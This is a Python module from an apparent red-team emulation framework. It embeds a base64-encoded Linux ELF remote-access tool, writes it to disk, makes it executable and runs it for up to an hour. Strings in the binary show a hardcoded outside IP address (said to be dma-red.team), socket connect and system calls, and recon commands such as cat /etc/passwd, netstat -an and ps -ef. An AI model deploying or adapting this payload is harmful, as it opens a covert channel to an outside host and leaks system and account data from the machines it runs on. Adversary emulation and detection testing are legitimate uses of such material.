try:
    from framework.main import ModuleBase
except ImportError:
    pass

class ReverseShellOnDiskElf(ModuleBase):
    # This does the same thing as Python rats above. Hardcoded to IP address of dma-red.team
    ELF = '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'

    @property
    def relative_delay(self):
        return 70

    @property
    def absolute_duration(self):
        return 60 * 60

    def run(self):
        import base64, stat, os
        self.start()
        elf = base64.b64decode(self.ELF)
        fname = '${ELF_TMPFILE}'
        with open(fname, 'wb') as f:
            f.write(elf)
        os.chmod(fname, stat.S_IRUSR|stat.S_IWUSR|stat.S_IXUSR)
        pid = self.util_childproc(fname=fname, args=(fname,))
        self.hec_logger('Kicked off ELF', filename=fname, pid=pid)
        self.util_orphanwait(pid, timeout=self.absolute_duration)
        os.unlink(fname)
        self.hec_logger('Removed RAT from disk', filename=fname)
        self.finish()
